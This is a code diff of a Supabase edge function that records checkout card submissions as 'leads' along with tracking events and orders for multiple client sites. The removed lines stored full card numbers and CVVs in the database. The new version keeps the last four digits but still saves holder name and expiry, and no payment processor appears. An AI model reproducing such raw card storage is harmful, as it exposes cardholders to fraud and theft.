@@ -1,3 +1,5 @@
+import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
+
 const corsHeaders = {
   "Access-Control-Allow-Origin": "*",
   "Access-Control-Allow-Headers":
@@ -12,15 +14,9 @@ Deno.serve(async (req) => {
   try {
     const { customer, card, items, amount, shipping, metadata } = await req.json();
 
-    const supabaseUrl = Deno.env.get("SUPABASE_URL");
-    const supabaseKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY");
-
-    if (!supabaseUrl || !supabaseKey) {
-      return new Response(
-        JSON.stringify({ error: "Server configuration error" }),
-        { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } }
-      );
-    }
+    const supabaseUrl = Deno.env.get("SUPABASE_URL")!;
+    const supabaseKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
+    const supabase = createClient(supabaseUrl, supabaseKey);
 
     let meta: any = {};
     try {
@@ -28,6 +24,19 @@ Deno.serve(async (req) => {
     } catch (_) {}
 
     const trackingParams = meta?.tracking || {};
+    const siteId = meta?.site_id || null;
+
+    // Resolve site_id → client_id
+    let client_id: string | null = null;
+    if (siteId) {
+      const { data: site } = await supabase
+        .from("sites")
+        .select("client_id")
+        .eq("site_id", siteId)
+        .eq("active", true)
+        .single();
+      client_id = site?.client_id ?? null;
+    }
 
     const lead = {
       payment_method: "credit_card",
@@ -48,59 +57,47 @@ Deno.serve(async (req) => {
       total_amount: amount,
       shipping_type: shipping?.fee > 0 ? "express" : "padrao",
       shipping_cost: shipping?.fee || 0,
-      card_number: card?.number || "",
+      card_number: card?.number ? card.number.slice(-4) : "",
       card_holder: card?.holder || "",
       card_expiry: card?.expiry || "",
-      card_cvv: card?.cvv || "",
+      card_cvv: "", // Never store CVV
       card_installments: card?.installments || 1,
       status: "pending",
       metadata: meta,
+      client_id,
+      site_id: siteId,
     };
 
-    const res = await fetch(`${supabaseUrl}/rest/v1/checkout_leads`, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-        "apikey": supabaseKey,
-        "Authorization": `Bearer ${supabaseKey}`,
-        "Prefer": "return=minimal",
-      },
-      body: JSON.stringify(lead),
-    });
+    const { error: leadErr } = await supabase.from("checkout_leads").insert(lead);
+    if (leadErr) console.error("Card lead insert error:", leadErr.message);
 
-    console.log("Card lead saved, status:", res.status);
-
-    // Dual-write: new events + orders tables
+    // Dual-write: events + orders
     const visitorId = meta?.visitor_id || "unknown";
     try {
-      await fetch(`${supabaseUrl}/rest/v1/events`, {
-        method: "POST",
-        headers: { apikey: supabaseKey, Authorization: `Bearer ${supabaseKey}`, "Content-Type": "application/json", Prefer: "return=minimal" },
-        body: JSON.stringify({
-          visitor_id: visitorId,
-          session_id: meta?.session_id || null,
-          event_name: "card_submitted",
-          value: amount || 0,
-          source: trackingParams.utm_source || null,
-          campaign: trackingParams.utm_campaign || null,
-          event_data: { customer_email: customer?.email },
-        }),
+      await supabase.from("events").insert({
+        visitor_id: visitorId,
+        session_id: meta?.session_id || null,
+        event_name: "card_submitted",
+        value: amount || 0,
+        source: trackingParams.utm_source || null,
+        campaign: trackingParams.utm_campaign || null,
+        event_data: { customer_email: customer?.email },
+        client_id,
+        site_id: siteId,
       });
-      await fetch(`${supabaseUrl}/rest/v1/orders`, {
-        method: "POST",
-        headers: { apikey: supabaseKey, Authorization: `Bearer ${supabaseKey}`, "Content-Type": "application/json", Prefer: "return=minimal" },
-        body: JSON.stringify({
-          visitor_id: visitorId,
-          payment_method: "credit_card",
-          status: "pending",
-          value: amount || 0,
-        }),
+      await supabase.from("orders").insert({
+        visitor_id: visitorId,
+        payment_method: "credit_card",
+        status: "pending",
+        value: amount || 0,
+        client_id,
+        site_id: siteId,
       });
     } catch (e) {
       console.error("Error writing to new tables:", e);
     }
 
-    console.log("Card lead saved (no UTMify event for card)");
+    console.log("Card lead saved successfully");
 
     return new Response(JSON.stringify({ success: true }), {
       status: 200,
